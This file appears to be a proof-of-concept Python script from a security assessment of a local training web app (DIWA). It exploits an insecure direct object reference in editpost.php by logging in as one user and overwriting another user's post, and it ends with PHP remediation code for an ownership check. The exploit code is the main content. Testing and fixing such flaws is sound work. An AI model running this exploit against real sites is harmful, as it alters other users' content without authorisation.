#!/usr/bin/env python3
"""
Stage 2 POC: Insecure Direct Object Reference (IDOR) in editpost.php
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: editpost.php only checks if user is logged in, not if user owns the post
"""

import requests
import sys
import urllib.parse

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_idor_edit_post():
    """
    Login as user A, then attempt to edit a post created by user B.
    Payload: POST ?page=editpost&id=<post_id> with modified content
    Expected: Unauthorized user can modify another user's post
    """
    print("[*] Testing IDOR - Unauthorized Post Editing...")
    
    try:
        # Login as test user (user A)
        login_payload = {
            'email': 'user@example.com',
            'password': 'password'
        }
        resp = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
        
        # Get posts from board to find a post ID not owned by us
        resp_board = SESSION.get(f"{TARGET}/?page=board")
        
        # Try to find post IDs (usually sequential)
        import re
        post_matches = re.findall(r'editpost&id=(\d+)', resp_board.text)
        
        if not post_matches:
            # Try alternative pattern
            post_matches = re.findall(r'id["\']?\s*:\s*["\']?(\d+)', resp_board.text)
        
        if not post_matches:
            print("❌ NOT REPRODUCIBLE: Could not find post IDs")
            return False
        
        # Try editing a post we didn't create (lower ID)
        target_post_id = post_matches[0]
        
        edit_payload = {
            'post': 'HACKED: This post was edited by unauthorized user'
        }
        
        resp_edit = SESSION.post(
            f"{TARGET}/?page=editpost&id={target_post_id}",
            data=edit_payload,
            allow_redirects=False
        )
        
        # Check if edit was successful (redirect or success message)
        if 'edited=1' in resp_edit.headers.get('Location', '') or 'success' in resp_edit.text.lower():
            print(f"✅ VULNERABLE: Successfully edited post ID {target_post_id} without ownership check")
            return True
        
        # Check if we were redirected back (indicates modification)
        if resp_edit.status_code in [301, 302, 303, 307]:
            print(f"✅ VULNERABLE: Edit endpoint accepted unauthorized modification request")
            return True
        
        # Try to view the thread and see if edit was persisted
        resp_view = SESSION.get(f"{TARGET}/?page=thread&id=1")
        if 'HACKED' in resp_view.text:
            print("✅ VULNERABLE: Unauthorized edit persisted in database")
            return True
        
        print("❌ NOT REPRODUCIBLE: Edit was blocked or denied")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_idor_edit_post()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Always verify the requesting user owns the resource before allowing modification:

  // In editpost.php or model->editPost()
  try {
      // Get the post
      $post = $model->getPost($_GET['id']);
      if (!$post) {
          http_response_code(404);
          die('Post not found');
      }
      
      // Verify ownership: post's user_id must match session user_id
      if ($post[0]['user_id'] != $_SESSION['user_id']) {
          http_response_code(403);
          die('Forbidden: You do not own this post');
      }
      
      // NOW allow edit
      if ($_SERVER['REQUEST_METHOD'] === 'POST') {
          if ($model->editPost($_GET['id'], $_POST['post'])) {
              redirect('?page=thread&id=' . $post[0]['thread_id'] . '&edited=1');
          }
      }
  }
  catch(Exception $ex) {
      error(500, 'Error', $ex);
  }

Key points:
- Always verify ownership/permission before ANY state-changing operation
- Check: post_user_id == session_user_id
- Use http_response_code(403) for permission denied
- Apply same pattern to: editpost, deletepost, editprofile, edituser (if not admin)
- For admin-only actions, verify $_SESSION['user']['is_admin'] == 1
"""
